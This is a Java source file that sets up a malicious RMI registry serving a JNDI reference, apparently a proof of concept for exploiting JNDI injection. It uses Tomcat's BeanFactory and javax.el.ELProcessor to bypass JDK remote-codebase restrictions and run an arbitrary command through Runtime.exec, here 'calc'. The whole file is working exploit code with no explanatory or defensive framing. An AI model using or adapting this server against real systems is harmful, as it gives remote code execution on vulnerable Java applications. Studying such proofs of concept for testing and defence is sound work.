package rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.Reference;
import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class JdkBypassReferenceRMIServer {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);

        Reference reference = execByEL("calc");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("Calc", referenceWrapper);

        System.out.println("JDK Bypass Reference RMI Server start...");
        Thread.currentThread().join();
    }

    private static ResourceRef execByEL(String command) {
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", String.format(
                "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(" +
                        "\"java.lang.Runtime.getRuntime().exec('%s')\"" +
                        ")",
                command
        )));
        return ref;
    }
}
